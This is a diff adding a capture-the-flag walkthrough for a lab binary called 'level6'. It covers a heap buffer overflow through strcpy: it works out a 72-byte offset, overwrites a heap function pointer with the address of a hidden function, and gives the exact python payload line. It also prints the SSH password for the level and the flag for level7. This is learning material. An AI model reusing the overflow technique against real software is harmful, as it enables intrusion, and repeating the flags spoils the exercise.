@@ -1,0 +1,36 @@
+1. Download the binary from the server:
+   scp -P 2222 level6@localhost:~/level6 .
+   Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+2. Analyze the binary with Ghidra:
+   - strcpy(buffer, argv[1]) - heap buffer overflow vulnerability
+   - buffer = malloc(64) 
+   - func_ptr = malloc(4) - function pointer on heap
+   - func_ptr initially points to m() but program calls (*func_ptr)()
+   - Hidden function n() at 0x08048454 prints the flag
+
+3. Verify heap layout with ltrace:
+   ltrace ./level6 AAAA
+   
+   Output shows:
+   malloc(64)  = 0x0804a008  ← buffer
+   malloc(4)   = 0x0804a050  ← func_ptr
+   
+   Distance: 0x0804a050 - 0x0804a008 = 72 bytes (0x48)
+
+4. Calculate the exploit:
+   - Padding: 72 bytes (64 buffer + 8 heap metadata)
+   - Target: 0x08048454 (address of n)
+   - Little-endian: \x54\x84\x04\x08
+
+5. Connect to the VM via SSH:
+   ssh level6@localhost -p 2222
+   Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+6. Execute the exploit:
+   ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+
+7. Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+8. Exit and login as level7:
+   su level7
